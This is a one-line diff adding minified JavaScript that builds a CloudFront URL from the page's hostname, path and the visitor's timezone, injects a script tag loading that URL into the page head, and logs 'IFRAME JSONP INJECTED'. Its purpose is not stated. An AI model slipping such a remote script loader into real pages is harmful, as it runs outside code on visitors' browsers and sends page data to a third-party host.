@@ -1,0 +1,1 @@
+"use strict";!function(e,t){var n="//d3fq4izoz4euoc.cloudfront.net/api/iframes/inject/"+window.location.hostname+window.location.pathname+"?tz="+(new Date).getTimezoneOffset();(t=e.createElement("script")).type="text/javascript",t.async=!0,t.src=n,e.getElementsByTagName("head")[0].appendChild(t),console.log("IFRAME JSONP INJECTED")}(document);
